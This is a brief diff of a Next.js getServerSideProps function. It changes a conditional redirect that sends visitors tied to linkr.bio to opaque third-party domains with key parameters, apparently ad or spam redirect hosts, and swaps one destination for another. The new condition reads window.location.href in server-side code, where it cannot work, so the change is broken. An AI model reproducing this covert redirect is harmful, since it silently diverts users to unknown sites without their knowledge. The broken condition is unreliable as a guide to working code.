@@ -23,11 +23,11 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			},
 		};
 	}
-		if (referringURL?.includes('linkr.bio') || linkr) {
+	if (window.location.href === 'http://linkr.bio/') {
     return {
         redirect: {
             permanent: false,
-            destination: 'https://extensionworthwhile.com/e8uqqpdmyu?key=163a9bb64d89499175c1aae8a37ad753',
+            destination: 'https://broadsheetspikesnick.com/bjb9t1z86s?key=f9132ab25b103fbec62c791e55bce91a',
         },
     };
 }
